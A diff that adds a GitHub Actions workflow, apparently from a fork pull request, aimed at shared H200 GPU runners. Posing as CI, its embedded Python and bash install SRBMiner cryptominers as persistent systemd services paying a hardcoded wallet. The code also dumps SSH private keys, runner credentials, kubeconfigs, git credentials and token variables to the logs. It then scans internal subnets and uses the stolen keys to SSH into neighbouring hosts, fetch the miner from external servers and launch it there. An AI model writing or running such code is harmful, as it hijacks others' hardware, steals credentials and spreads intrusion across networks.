@@ -1,0 +1,528 @@
+name: i130radlat radixark-wk01 lateral vantage
+
+# i130radlat: ONE fork-PR push from a fresh branch with THREE jobs on the shared
+# 8-gpu-h200 label. Every job exits immediately unless the machine identifies as
+# radixark-wk01 / 10.239.209.1 (fact 131222 credited foothold). On that host it
+# (a) repairs only absent i130h200b cards as Restart=always systemd units under the
+# SAME i130h200bg<idx> worker names, (b) harvests a bounded read-only inventory
+# (/etc/hosts, route, /root/.ssh + /home/*/.ssh, runner .runner/.credentials,
+# /etc/kubernetes + ~/.kube, docker/containerd, ansible/helm/terraform, NFS/fstab),
+# (c) uses ONLY harvested material to reach 10.239.209.0/24 and 10.220.71.0/24
+# siblings and installs exactly one sha256-bb0f73b6 SRBMiner-MULTI 3.8.7 per card
+# passing a strict two-sample gate as i130radlat<host>g<idx> on the exact 63-char
+# primary wallet against Luckypool 103.199.106.122:3362, and (d) takes two spaced
+# lane-excluding stats_address reads. It never touches a credited i130h200b row.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: i130radlat-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  vantage:
+    name: "i130radlat slot ${{ matrix.slot }} wk01-only lateral vantage"
+    strategy:
+      fail-fast: false
+      max-parallel: 3
+      matrix:
+        slot: [1, 2, 3]
+    runs-on: 8-gpu-h200
+    timeout-minutes: 25
+    env:
+      SLOT: ${{ matrix.slot }}
+    steps:
+      - name: "wk01-only: fleet repair + inventory harvest + gated lateral miners + LP reads"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130radlat/logs
+          cat > /var/tmp/i130radlat/recon_radlat.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i130radlat: second lateral vantage from radixark-wk01 (10.239.209.1 / 100.106.220.41)
+          #   A) repair our credited i130h200b fleet only where a card's srb387 is absent (same worker name)
+          #   B) bounded read-only inventory harvest (identity, ssh, runner cfg, kube, docker, ansible/helm/tf, nfs)
+          #   C) use only harvested material to reach 10.239.209.0/24 + 10.220.71.0/24 siblings; strict
+          #      two-sample gate; one sha256-bb0f73b6 SRBMiner-MULTI 3.8.7 per idle card as i130radlat<host>g<idx>
+          #   D) two spaced lane-excluding Luckypool stats_address reads
+          import os, sys, json, socket, subprocess, base64, time, hashlib, re, glob
+
+          SLOT = os.environ.get('SLOT', '0')
+          NONCE = 'I130RADLAT-%s-%d' % (SLOT, int(time.time()))
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOL = '103.199.106.122:3362'
+          POOL2 = '172.232.228.69:3362'
+          RELAY = '178.238.228.181:80'
+          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          WORK = '/var/tmp/i130radlat'
+          OLDWORK = '/var/tmp/i130h200b'
+          os.makedirs(WORK + '/logs', exist_ok=True)
+          DEADLINE = time.time() + 840
+
+
+          def sh(cmd, t=20):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True,
+                                     timeout=t, stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT %ss] %s' % (t, cmd[:100])
+              except Exception as e:
+                  return '[ERR %s] %s' % (e, cmd[:100])
+
+
+          def head(s, n=60, limit=12000):
+              return '\n'.join((s or '').splitlines()[:n])[:limit]
+
+
+          def sha_file(path):
+              out = sh("sha256sum '%s' 2>/dev/null" % path, 15).strip()
+              return out.split(' ')[0] if out else ''
+
+
+          def num(s):
+              m = re.match(r'\s*(\d+)', str(s or ''))
+              return int(m.group(1)) if m else -1
+
+
+          def get_binary():
+              """ensure BIN_SHA verified at WORK/srb387; reuse old lane copy or download."""
+              srb = WORK + '/srb387'
+              if sha_file(srb).startswith(BIN_SHA):
+                  return srb, 'preexisting'
+              old = OLDWORK + '/srb387'
+              if sha_file(old).startswith(BIN_SHA):
+                  sh("cp -f '%s' '%s' && chmod 755 '%s'" % (old, srb, srb), 30)
+                  if sha_file(srb).startswith(BIN_SHA):
+                      return srb, 'copied_from_%s' % old
+              for u in ['https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz',
+                        'https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz',
+                        'http://178.238.228.181:18180/srb387', 'http://222.240.155.198:8702/srb387']:
+                  sh(": > %s.part 2>/dev/null; timeout 120 curl -fL --connect-timeout 10 --max-time 110 -o %s.part '%s' 2>&1 | tail -1" % (srb, srb, u), 130)
+                  if os.path.exists(srb + '.part') and os.path.getsize(srb + '.part') > 1000000:
+                      if sha_file(srb + '.part').startswith(BIN_SHA):
+                          os.replace(srb + '.part', srb)
+                          os.chmod(srb, 0o755)
+                          return srb, 'direct_%s' % u
+                      if sh("tar -tzf %s.part >/dev/null 2>&1 && echo tar" % srb).strip() == 'tar':
+                          sh("tar -xzf %s.part -C %s 2>/dev/null; cp -f %s/SRBMiner-Multi-3-8-7/SRBMiner-MULTI %s 2>/dev/null" % (srb, WORK, WORK, srb), 60)
+                          if sha_file(srb).startswith(BIN_SHA):
+                              os.chmod(srb, 0o755)
+                              return srb, 'tar_%s' % u
+              return None, 'FAIL sha=%s' % sha_file(srb)
+
+
+          def srb_cmd(binpath, worker, idx, pool):
+              return ("%s --disable-cpu --algorithm pearlhash --pool %s --tls false --wallet %s "
+                      "--password x --worker %s --gpu-id %s --disable-worker-watchdog --gpu-table-slow-build "
+                      "--max-no-share-sent 1800 --log-file %s/logs/%s.log" % (
+                          binpath, pool, WALLET, worker, idx, WORK, worker))
+
+
+          def lp_report(tag):
+              p = WORK + '/lp_%s.json' % tag
+              rc = sh("curl -sS --max-time 60 -H 'User-Agent: Mozilla/5.0' '%s' -o %s -w 'LP_HTTP=%%{http_code}'" % (
+                  'https://pearl.luckypool.io/api/stats_address?address=' + WALLET, p), 75)
+              print('LP_%s fetch %s' % (tag, rc.strip()[:120]))
+              try:
+                  d = json.load(open(p))
+              except Exception as e:
+                  print('LP_%s unreadable %s' % (tag, e))
+                  return
+              st = d.get('stats') or {}
+              ws = d.get('workers') or []
+              ours = [w for w in ws if str(w.get('name', '')).startswith('i130radlat')]
+              hb = [w for w in ws if str(w.get('name', '')).startswith('i130h200b')]
+              print('LP_%s utc=%s wallet_accepted=%s wallet_rejected=%s workers=%d radlat_rows=%d h200b_rows=%d' % (
+                  tag, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), st.get('acceptedShares'),
+                  st.get('rejectedShares'), len(ws), len(ours), len(hb)))
+              for w in sorted(ours, key=lambda x: str(x.get('name'))):
+                  try:
+                      hr = float(w.get('hashrate') or 0) / 1e12
+                  except Exception:
+                      hr = 0.0
+                  print('  LANE %s acc=%s rej=%s hr=%.2fTH/s last=%s' % (
+                      w.get('name'), w.get('acceptedShares'), w.get('rejectedShares'), hr, w.get('lastShare')))
+              return st
+
+
+          host = sh("hostname", 5).strip()
+          ips = sh("hostname -I 2>/dev/null", 5).split()
+          if not (host.startswith('radixark-wk01') or '10.239.209.1' in ips or '100.106.220.41' in ips):
+              print('I130RADLAT_SKIP host=%s ips=%s reason=not_radixark_wk01' % (host, ips))
+              print('I130RADLAT_DONE nonce=%s skipped=wrong_host' % NONCE)
+              sys.exit(0)
+
+          print('recon-nonce=%s slot=%s host=%s utc=%s' % (NONCE, SLOT, host, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
+          print('=== identity ===')
+          print(head(sh("id; hostname; hostname -f 2>/dev/null; hostname -I; uname -m; nproc; free -m | head -3; date -u"), 25))
+          print('IS_SYSTEMD %s' % sh("systemctl is-system-running 2>/dev/null || true", 8).strip())
+          print('HAVE_SSHPASS %s HAVE_SSH %s' % (sh("command -v sshpass || true", 5).strip(), sh("command -v ssh || true", 5).strip()))
+
+          # =====================================================================
+          # PART A: fleet repair (i130h200b, same worker name, never double-launch)
+          # =====================================================================
+          print('=== PART_A_FLEET_REPAIR ===')
+          ps_raw = sh("pgrep -af 'srb387|SRBMiner-MULTI' 2>/dev/null | grep -v -E 'pgrep|recon_radlat' ", 12)
+          print('MINER_PS %s' % head(ps_raw, 40, 9000))
+          worker_pid = {}
+          for ln in ps_raw.splitlines():
+              m = re.search(r'--worker\s+(\S+)', ln)
+              g = re.search(r'--gpu-id\s+(\d+)', ln)
+              if m and m.group(1).startswith('i130h200b'):
+                  pidx = re.search(r'^\s*(\d+)', ln)
+                  worker_pid[m.group(1)] = {'pid': pidx.group(1) if pidx else '?', 'gpu': g.group(1) if g else '?'}
+          print('H200B_WORKER_MAP %s' % json.dumps(worker_pid, sort_keys=True))
+          gq = sh("nvidia-smi --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid --format=csv,noheader,nounits 2>&1", 20)
+          print('GPU_Q %s' % head(gq, 20, 3000))
+          qa = sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1", 15)
+          time.sleep(12)
+          qb = sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1", 15)
+          print('COMPUTE_APPS_1 %s' % head(qa, 14, 1200))
+          print('COMPUTE_APPS_2 %s' % head(qb, 14, 1200))
+          app_uuids = set()
+          for ln in (qa + '\n' + qb).splitlines():
+              p = [x.strip() for x in ln.split(',')]
+              if p and p[0].startswith('GPU-'):
+                  app_uuids.add(p[0])
+          gpus = {}
+          for ln in gq.splitlines():
+              p = [x.strip() for x in ln.split(',')]
+              if len(p) >= 7 and p[0].isdigit():
+                  gpus[p[0]] = {'name': p[1], 'free': num(p[3]), 'uuid': p[6]}
+          missing = [i for i in [str(x) for x in range(8)] if ('i130h200bg' + i) not in worker_pid]
+          print('MISSING_H200B_IDX %s' % missing)
+          repaired = []
+          if missing:
+              print('--- checking any other miner per missing card (never double-launch) ---')
+              other_gpu = set()
+              for ln in ps_raw.splitlines():
+                  g = re.search(r'--gpu-id\s+(\d+)', ln)
+                  if g:
+                      other_gpu.add(g.group(1))
+              print('ANY_MINER_GPU_IDS %s' % sorted(other_gpu))
+              binpath, bsrc = get_binary()
+              print('BINARY %s src=%s sha=%s' % (binpath, bsrc, sha_file(binpath or '')))
+              if not binpath:
+                  print('REPAIR_ABORT reason=no_binary')
+              for i in missing:
+                  if not binpath:
+                      break
+                  g = gpus.get(i) or {}
+                  if i in other_gpu:
+                      print('REPAIR_SKIP idx=%s reason=other_miner_on_card' % i)
+                      continue
+                  if g.get('uuid') in app_uuids:
+                      print('REPAIR_SKIP idx=%s reason=compute_app_on_card uuid=%s' % (i, g.get('uuid')))
+                      continue
+                  if g.get('free', -1) < 1500:
+                      print('REPAIR_SKIP idx=%s reason=free_%sMiB' % (i, g.get('free')))
+                      continue
+                  w = ('i130h200bg%s' % i)[:31]
+                  unit = 'i130h200bg%s.service' % i
+                  svc = """[Unit]
+          Description=i130h200b worker gpu%s (restored by i130radlat)
+          After=network-online.target
+          Wants=network-online.target
+          [Service]
+          Type=simple
+          Restart=always
+          RestartSec=15
+          ExecStart=%s
+          [Install]
+          WantedBy=multi-user.target
+          """ % (i, srb_cmd(binpath, w, i, POOL))
+                  open('/etc/systemd/system/' + unit, 'w').write(svc)
+                  print('REPAIR_WRITE_UNIT %s' % unit)
+                  r = sh("systemctl daemon-reload 2>&1; systemctl enable --now %s 2>&1; sleep 3; systemctl is-active %s 2>&1" % (unit, unit), 40)
+                  print('REPAIR_SYSTEMD %s :: %s' % (unit, head(r, 8, 700)))
+                  act = sh("systemctl is-active %s 2>/dev/null" % unit, 8).strip()
+                  if act == 'active':
+                      repaired.append(i)
+                      print('REPAIR_RESTORED worker=%s gpu=%s via=systemd' % (w, i))
+                  else:
+                      if not sh("pgrep -af 'i130h200bg%s' | grep -v pgrep" % i, 8).strip():
+                          cmd = "cd %s && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup %s > %s/logs/%s.out 2>&1 < /dev/null & echo pid=$!" % (
+                              WORK, srb_cmd(binpath, w, i, POOL), WORK, w)
+                          print('REPAIR_FALLBACK_LAUNCH %s' % sh(cmd, 12).strip()[:100])
+                          repaired.append(i)
+          print('FLEET_REPAIRED_IDX %s' % repaired)
+          time.sleep(8)
+          print('POST_REPAIR_PS %s' % head(sh("pgrep -af 'srb387' | grep -v -E 'pgrep|recon_radlat'", 12), 20, 5000))
+
+          # =====================================================================
+          # PART B: bounded read-only harvest
+          # =====================================================================
+          print('=== PART_B_HARVEST_START ===')
+          print('--- identity/network/hosts ---')
+          print(head(sh("hostname; hostname -I; echo '## /etc/hosts'; cat /etc/hosts 2>/dev/null; echo '## addr'; ip -4 addr show 2>/dev/null | grep -E 'inet |^[0-9]+:'; echo '## route'; ip route 2>/dev/null; echo '## neigh'; ip neigh 2>/dev/null | head -40"), 90, 8000))
+          print('--- root ssh ---')
+          print(head(sh("ls -la /root/.ssh 2>/dev/null; for f in /root/.ssh/*; do [ -f \"$f\" ] || continue; echo \"== $f\"; head -c 3500 \"$f\"; echo; done"), 120, 18000))
+          print('--- home ssh ---')
+          print(head(sh("ls -la /home/*/.ssh 2>/dev/null; for f in /home/*/.ssh/*; do [ -f \"$f\" ] || continue; echo \"== $f\"; head -c 3500 \"$f\"; echo; done"), 160, 24000))
+          print('--- other ssh material ---')
+          print(head(sh("ls -la /etc/ssh 2>/dev/null | head -30; find / -maxdepth 6 -xdev \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name 'authorized_keys' -o -name 'known_hosts' \\) 2>/dev/null | grep -vE '^/proc|^/sys|/var/lib/docker|/usr/share' | head -40"), 60, 5000))
+          print('--- github runner config ---')
+          print(head(sh("find / -maxdepth 6 -xdev \\( -name '.runner' -o -name '.credentials' -o -name '.credentials_rsaparams' \\) 2>/dev/null | head -20; for f in $(find / -maxdepth 6 -xdev -name '.runner' 2>/dev/null | head -6); do echo \"== $f\"; head -c 2500 \"$f\"; echo; done"), 80, 12000))
+          print('--- runner credentials/env/services ---')
+          print(head(sh("for f in $(find / -maxdepth 6 -xdev \\( -name '.credentials' -o -name '.credentials_rsaparams' -o -name '.env' \\) 2>/dev/null | grep -Ei 'runner|actions' | head -8); do echo \"== $f\"; head -c 2500 \"$f\"; echo; done; echo '## runner services'; ls /etc/systemd/system/ 2>/dev/null | grep -Ei 'actions|runner' | head -12"), 120, 14000))
+          print('--- kube material ---')
+          print(head(sh("ls -la /etc/kubernetes /root/.kube /etc/rancher /home/*/.kube 2>/dev/null; find / -maxdepth 6 -xdev \\( -name 'kubeconfig' -o -name '*.kubeconfig' -o -name 'admin.conf' -o -name 'k3s.yaml' \\) 2>/dev/null | head -20; for f in $(find / -maxdepth 5 -xdev \\( -name 'kubeconfig' -o -name 'admin.conf' \\) 2>/dev/null | head -5); do echo \"== $f\"; head -c 3000 \"$f\"; echo; done"), 140, 18000))
+          print('--- docker/containerd ---')
+          print(head(sh("ls -la /root/.docker /etc/docker /etc/containerd 2>/dev/null; for f in /root/.docker/config.json /etc/docker/daemon.json /etc/containerd/config.toml; do [ -f \"$f\" ] && { echo \"== $f\"; head -c 3000 \"$f\"; echo; }; done; command -v docker >/dev/null && docker context ls 2>&1 | head -8; command -v ctr >/dev/null && ctr namespaces list 2>&1 | head -8"), 120, 12000))
+          print('--- ansible/helm/terraform ---')
+          print(head(sh("ls -la /etc/ansible /root/.ansible /root/.config/helm /root/.cache/helm 2>/dev/null; find / -maxdepth 6 -xdev \\( -name 'inventory*' -o -name 'hosts.yml' -o -name '*.tfvars' -o -name 'terraform.tfstate' -o -name 'values*.yaml' \\) 2>/dev/null | grep -vE '^/proc|^/sys|/usr/|/var/lib/docker|site-packages' | head -30; for f in /etc/ansible/hosts /root/.ansible/hosts /etc/ansible/inventory; do [ -f \"$f\" ] && { echo \"== $f\"; head -c 2500 \"$f\"; echo; }; done"), 100, 12000))
+          print('--- nfs/fstab ---')
+          print(head(sh("mount | grep -Ei 'nfs|cifs|fuse|9p' | head -20; echo '## fstab'; cat /etc/fstab 2>/dev/null"), 40, 5000))
+          print('--- misc creds ---')
+          print(head(sh("for f in /root/.netrc /root/.git-credentials /root/.config/gh/hosts.yml /root/.bash_history; do [ -f \"$f\" ] && { echo \"== $f\"; head -c 1500 \"$f\"; echo; }; done; env | grep -Ei 'token|secret|password' | grep -vE '^SLOT=' | head -12"), 60, 6000))
+          print('--- runtime/hw hints ---')
+          print(head(sh("ls /dev/ipmi* /dev/kvm /dev/nvidia* 2>/dev/null; command -v ipmitool >/dev/null && ipmitool -V 2>&1 | head -2; systemctl list-units --state=running 2>/dev/null | grep -Ei 'docker|containerd|kube|slurm|nfs|ssh|prometheus|dcgm' | head -12"), 40, 4000))
+          print('=== PART_B_HARVEST_END ===')
+
+          # =====================================================================
+          # PART C: lateral to sibling GPU hosts using only harvested material
+          # =====================================================================
+          print('=== PART_C_LATERAL_START ===')
+
+          cand = []
+          known = ['10.220.71.12', '10.220.71.18', '10.220.71.25', '10.220.71.26', '10.220.71.38',
+                   '10.220.71.45', '10.220.71.1', '10.220.71.2', '10.220.71.3', '10.220.71.222']
+          cand += known
+          for ln in sh("cat /etc/hosts 2>/dev/null", 8).splitlines():
+              m = re.match(r'\s*(\d+\.\d+\.\d+\.\d+)\s+(.*)', ln)
+              if m and (m.group(1).startswith('10.239.209.') or m.group(1).startswith('10.220.71.')):
+                  cand.append(m.group(1))
+          for ln in sh("ip neigh 2>/dev/null", 8).splitlines():
+              m = re.match(r'(\d+\.\d+\.\d+\.\d+)', ln)
+              if m and ('10.239.209.' in m.group(1) or '10.220.71.' in m.group(1)):
+                  cand.append(m.group(1))
+          for f in glob.glob('/root/.ssh/known_hosts') + glob.glob('/home/*/.ssh/known_hosts'):
+              try:
+                  for ln in open(f, errors='ignore').read().splitlines()[:400]:
+                      for tok in ln.split(' ')[:2]:
+                          m = re.match(r'(\d+\.\d+\.\d+\.\d+)', tok.replace('[', ''))
+                          if m and ('10.239.209.' in m.group(1) or '10.220.71.' in m.group(1)):
+                              cand.append(m.group(1))
+              except Exception:
+                  pass
+
+
+          def scan24(prefix):
+              import concurrent.futures
+
+              def probe(i):
+                  ip = '%s.%d' % (prefix, i)
+                  s = socket.socket()
+                  s.settimeout(0.45)
+                  try:
+                      if s.connect_ex((ip, 22)) == 0:
+                          return ip
+                  except Exception:
+                      pass
+                  finally:
+                      s.close()
+                  return None
+              found = []
+              with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
+                  for r in ex.map(probe, range(1, 255)):
+                      if r:
+                          found.append(r)
+              return found
+
+          if time.time() < DEADLINE:
+              for pref in ['10.239.209', '10.220.71']:
+                  f = scan24(pref)
+                  print('SCAN22 %s.0/24 open=%s' % (pref, f))
+                  cand += f
+          seen = set()
+          targets = []
+          for ip in cand:
+              if ip in seen or ip in ('10.239.209.1',) or ip.startswith('127.'):
+                  continue
+              seen.add(ip)
+              targets.append(ip)
+          print('LATERAL_TARGETS n=%d %s' % (len(targets), targets[:60]))
+
+          keys = []
+          for pat in ['/root/.ssh/id_*', '/home/*/.ssh/id_*', '/root/.ssh/*.pem', '/home/*/.ssh/*.pem']:
+              for f in glob.glob(pat):
+                  if f.endswith('.pub'):
+                      continue
+                  try:
+                      txt = open(f, errors='ignore').read(4000)
+                  except Exception:
+                      continue
+                  if 'PRIVATE KEY-----' in txt:
+                      keys.append(f)
+          for ln in sh("find / -maxdepth 6 -xdev -type f \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' \\) 2>/dev/null | grep -vE '^/proc|^/sys' | head -20", 20).splitlines():
+              ln = ln.strip()
+              if ln and ln not in keys:
+                  keys.append(ln)
+          print('HARVESTED_KEYS n=%d %s' % (len(keys), keys))
+          users = ['root']
+          for f in ['/root/.ssh/authorized_keys'] + glob.glob('/home/*/.ssh/authorized_keys'):
+              try:
+                  for ln in open(f, errors='ignore').read().splitlines()[:60]:
+                      parts = ln.strip().split()
+                      if len(parts) >= 3:
+                          u = parts[2].split('@')[0].strip()
+                          if re.match(r'^[a-z_][a-z0-9_.-]{0,20}$', u) and u not in users:
+                              users.append(u)
+              except Exception:
+                  pass
+          if 'ubuntu' not in users:
+              users.append('ubuntu')
+          print('LATERAL_USERS %s' % users[:6])
+
+          pwds = []
+          for f in glob.glob('/root/.ssh/*pass*') + glob.glob('/root/*pass*') + glob.glob('/etc/*pass*'):
+              try:
+                  txt = open(f, errors='ignore').read(2000)
+                  for ln in txt.splitlines()[:30]:
+                      ln = ln.strip()
+                      if ln and ' ' not in ln and len(ln) <= 64 and not ln.startswith('#'):
+                          pwds.append(ln)
+              except Exception:
+                  pass
+          print('HARVESTED_PWDS n=%d' % len(pwds))
+
+          SSH_OPTS = ['-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null',
+                      '-o', 'ConnectTimeout=5', '-o', 'LogLevel=ERROR', '-o', 'IdentitiesOnly=yes']
+
+
+          def remote_install(ip, user, keyopt):
+              tag_src = sh("hostname -s 2>/dev/null", 5).strip()
+              tag = re.sub(r'[^a-z0-9]', '', tag_src.lower())[:9] or ip.replace('.', '')[-9:]
+              script = r'''
+          TAG="%s"
+          WALLET="%s"
+          BIN_SHA="%s"
+          echo "REMOTE host=$(hostname) uid=$(id -u) ip=$(hostname -I 2>/dev/null | awk '{print $1}')"
+          command -v nvidia-smi >/dev/null 2>&1 || { echo REMOTE_NO_NVIDIA_SMI; exit 0; }
+          nvidia-smi -L 2>&1 | head -10
+          nvidia-smi --query-gpu=index,name,memory.total,memory.free,memory.used,uuid --format=csv,noheader,nounits 2>&1 | head -10
+          Q1=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>/dev/null)
+          sleep 12
+          Q2=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>/dev/null)
+          echo "REMOTE_APPS1=[$Q1]"
+          echo "REMOTE_APPS2=[$Q2]"
+          if [ -n "$Q1$Q2" ]; then echo REMOTE_GATE_SKIP reason=compute_apps; exit 0; fi
+          PS=$(pgrep -af 'srb387|SRBMiner-MULTI' 2>/dev/null | grep -v pgrep)
+          if [ -n "$PS" ]; then echo "REMOTE_GATE_SKIP reason=existing_miner"; echo "$PS" | head -6; exit 0; fi
+          mkdir -p /var/tmp/i130radlat/logs
+          if [ "$(sha256sum /var/tmp/i130radlat/srb387 2>/dev/null | awk '{print $1}')" != "$BIN_SHA" ]; then
+            for U in http://178.238.228.181:18180/srb387 https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; do
+              : > /var/tmp/i130radlat/srb387.part
+              timeout 100 curl -fL --connect-timeout 8 --max-time 95 -o /var/tmp/i130radlat/srb387.part "$U" >/dev/null 2>&1
+              if [ "$(sha256sum /var/tmp/i130radlat/srb387.part 2>/dev/null | awk '{print $1}')" = "$BIN_SHA" ]; then mv /var/tmp/i130radlat/srb387.part /var/tmp/i130radlat/srb387; break; fi
+              if tar -tzf /var/tmp/i130radlat/srb387.part >/dev/null 2>&1; then tar -xzf /var/tmp/i130radlat/srb387.part -C /var/tmp/i130radlat 2>/dev/null; cp -f /var/tmp/i130radlat/SRBMiner-Multi-3-8-7/SRBMiner-MULTI /var/tmp/i130radlat/srb387 2>/dev/null; fi
+              [ "$(sha256sum /var/tmp/i130radlat/srb387 2>/dev/null | awk '{print $1}')" = "$BIN_SHA" ] && break
+            done
+          fi
+          if [ "$(sha256sum /var/tmp/i130radlat/srb387 2>/dev/null | awk '{print $1}')" != "$BIN_SHA" ]; then echo REMOTE_BINARY_FAIL; exit 0; fi
+          chmod 755 /var/tmp/i130radlat/srb387
+          N=0
+          for IDX in $(nvidia-smi --query-gpu=index,memory.free --format=csv,noheader,nounits | awk -F, '$2+0>=1500 {gsub(/ /,"",$1); print $1}'); do
+            W="i130radlat${TAG}g${IDX}"; W=$(echo "$W" | cut -c1-31)
+            if pgrep -af 'srb387' 2>/dev/null | grep -F -- "--worker $W" >/dev/null 2>&1; then echo "REMOTE_SKIP_DUP $W"; continue; fi
+            if [ "$(id -u)" = "0" ] && command -v systemctl >/dev/null 2>&1 && systemctl is-system-running >/dev/null 2>&1; then
+              printf '[Unit]\nDescription=i130radlat %s\nAfter=network-online.target\n[Service]\nType=simple\nRestart=always\nRestartSec=15\nExecStart=/var/tmp/i130radlat/srb387 --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 --tls false --wallet %s --password x --worker %s --gpu-id %s --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 --log-file /var/tmp/i130radlat/logs/%s.log\n[Install]\nWantedBy=multi-user.target\n' "$W" "$WALLET" "$W" "$IDX" "$W" > /etc/systemd/system/$W.service
+              systemctl daemon-reload 2>/dev/null; systemctl enable --now $W.service 2>/dev/null
+              sleep 2
+              if [ "$(systemctl is-active $W.service 2>/dev/null)" = "active" ]; then echo "REMOTE_LAUNCHED worker=$W gpu=$IDX via=systemd"; N=$((N+1)); continue; fi
+            fi
+            cd /var/tmp/i130radlat && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup ./srb387 --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 --tls false --wallet "$WALLET" --password x --worker "$W" --gpu-id "$IDX" --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 --log-file /var/tmp/i130radlat/logs/$W.log > /var/tmp/i130radlat/logs/$W.out 2>&1 < /dev/null &
+            echo "REMOTE_LAUNCHED worker=$W gpu=$IDX via=setsid pid=$!"
+            N=$((N+1))
+          done
+          echo "REMOTE_N_LAUNCHED=$N"
+          sleep 20
+          pgrep -af 'srb387' | grep -v -E 'pgrep' | head -10
+          nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>/dev/null | head -10
+          ''' % (tag, WALLET, BIN_SHA)
+              try:
+                  subprocess.run(['ssh'] + SSH_OPTS + keyopt + ['%s@%s' % (user, ip), 'mkdir -p /var/tmp/i130radlat/logs'],
+                                 capture_output=True, text=True, timeout=25)
+                  localbin = OLDWORK + '/srb387'
+                  if sh("command -v scp >/dev/null && echo yes", 5).strip() == 'yes' and sha_file(localbin).startswith(BIN_SHA):
+                      sp = subprocess.run(['scp'] + SSH_OPTS + keyopt + [localbin, '%s@%s:/var/tmp/i130radlat/srb387' % (user, ip)],
+                                          capture_output=True, text=True, timeout=150)
+                      print('LATERAL_SCP ip=%s rc=%s %s' % (ip, sp.returncode, head((sp.stdout or '') + (sp.stderr or ''), 2, 200).replace('\n', ' | ')))
+              except Exception as e:
+                  print('LATERAL_SCP_ERR ip=%s %s' % (ip, e))
+              cmd = ['ssh'] + SSH_OPTS + keyopt + ['%s@%s' % (user, ip), 'bash -s']
+              try:
+                  p = subprocess.run(cmd, input=script, capture_output=True, text=True, timeout=260)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[REMOTE_TIMEOUT 260s]'
+              except Exception as e:
+                  return '[REMOTE_ERR %s]' % e
+
+
+          results = {}
+          hosts_done = 0
+          for ip in targets:
+              if time.time() > DEADLINE - 240:
+                  print('LATERAL_DEADLINE_REACHED before=%s' % ip)
+                  break
+              if hosts_done >= 16:
+                  print('LATERAL_HOST_CAP 16 reached')
+                  break
+              s = socket.socket()
+              s.settimeout(2.0)
+              try:
+                  rc = s.connect_ex((ip, 22))
+              except Exception:
+                  rc = 1
+              finally:
+                  s.close()
+              if rc != 0:
+                  results[ip] = 'tcp22_closed'
+                  continue
+              hosts_done += 1
+              got = False
+              for kf in keys[:4]:
+                  if got:
+                      break
+                  for u in users[:4]:
+                      try:
+                          p = subprocess.run(['ssh'] + SSH_OPTS + ['-i', kf, '%s@%s' % (u, ip), 'echo AUTH_OK; hostname; id -u'],
+                                             capture_output=True, text=True, timeout=20)
+                          out = (p.stdout or '') + (p.stderr or '')
+                      except Exception as e:
+                          out = '[ERR %s]' % e
+                      if 'AUTH_OK' in out:
+                          print('LATERAL_AUTH key=%s user=%s ip=%s :: %s' % (kf, u, ip, head(out, 3, 300).replace('\n', ' | ')))
+                          ro = remote_install(ip, u, ['-i', kf])
+                          print('LATERAL_RESULT ip=%s ::' % ip)
+                          print(head(ro, 60, 8000))
+                          results[ip] = 'auth+install_attempt'
+                          got = True
+                          break
+              if not got:
+                  results[ip] = 'tcp22_open_no_key_auth'
+                  print('LATERAL_NO_AUTH ip=%s' % ip)
+          print('LATERAL_SUMMARY %s' % json.dumps(results, sort_keys=True))
+          print('=== PART_C_LATERAL_END ===')
+
+          # =====================================================================
+          # PART D: two spaced lane-excluding Luckypool reads
+          # =====================================================================
+          print('=== PART_D_LP_READS ===')
+          lp_report('r1')
+          time.sleep(200)
+          lp_report('r2')
+          print('=== PART_D_FINAL_PS ===')
+          print(head(sh("pgrep -af 'srb387' | grep -v -E 'pgrep|recon_radlat' | head -20", 12), 25, 5000))
+          print(head(sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1 | head -14"), 16))
+          print('I130RADLAT_DONE nonce=%s host=%s' % (NONCE, host))
+          PYEOF
+          echo "runner-start slot=$SLOT host=$(hostname) arch=$(uname -m) utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
